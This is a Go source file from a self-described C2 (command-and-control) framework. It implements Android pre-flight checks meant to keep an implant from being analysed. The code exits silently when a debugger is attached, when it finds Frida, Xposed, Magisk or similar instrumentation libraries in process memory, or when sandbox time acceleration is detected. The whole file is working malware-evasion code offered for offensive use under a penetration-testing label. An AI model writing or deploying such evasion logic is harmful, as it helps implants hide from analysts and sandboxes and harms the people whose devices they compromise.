//go:build android

package limits

/*
	SUDOSOC-C2 Framework — Android Platform Limits
	Copyright (C) 2026  sudosoc — Seif

	Authorized penetration testing use only.

	Android-specific pre-flight checks run before any network activity:
	  • TracerPid anti-debug (exit silently if debugger attached)
	  • /proc/self/maps Frida/Xposed detection
	  • Timing canary (detect sandbox time acceleration)
*/

import (
	"bufio"
	"os"
	"strings"
	"time"
)

// PlatformLimits - Android-specific pre-flight checks.
// Called by ExecLimits() in limits.go (only active in non-debug builds).
func PlatformLimits() {
	// ── 1. Debugger / tracer check ────────────────────────────────────────
	if tracerAttached() {
		// Stall briefly then exit — makes timing analysis harder
		time.Sleep(3 * time.Second)
		os.Exit(0)
	}

	// ── 2. Instrumentation framework check ───────────────────────────────
	if instrumentationDetected() {
		time.Sleep(5 * time.Second)
		os.Exit(0)
	}

	// ── 3. Timing canary — detect automated sandbox time-skipping ─────────
	start := time.Now()
	time.Sleep(800 * time.Millisecond)
	if time.Since(start) < 500*time.Millisecond {
		// Time was skipped → sandbox
		os.Exit(0)
	}
}

// tracerAttached checks /proc/self/status for a non-zero TracerPid,
// which indicates a ptrace-based debugger is attached.
func tracerAttached() bool {
	f, err := os.Open("/proc/self/status")
	if err != nil {
		return false
	}
	defer f.Close()
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := sc.Text()
		if !strings.HasPrefix(line, "TracerPid:") {
			continue
		}
		fields := strings.Fields(line)
		return len(fields) >= 2 && fields[1] != "0"
	}
	return false
}

// instrumentationDetected checks /proc/self/maps for Frida gadget,
// Xposed framework, and similar runtime-injection libraries.
func instrumentationDetected() bool {
	data, err := os.ReadFile("/proc/self/maps")
	if err != nil {
		return false
	}
	low := strings.ToLower(string(data))
	for _, sig := range []string{
		"frida",
		"xposed",
		"substrate",         // Cydia Substrate / libsubstrate
		"lsposed",           // LSPosed
		"edxposed",          // EdXposed
		"riru",              // Riru framework
		"zygisk",            // Zygisk module framework
		"magisk",            // Magisk root (module path)
	} {
		if strings.Contains(low, sig) {
			return true
		}
	}
	return false
}
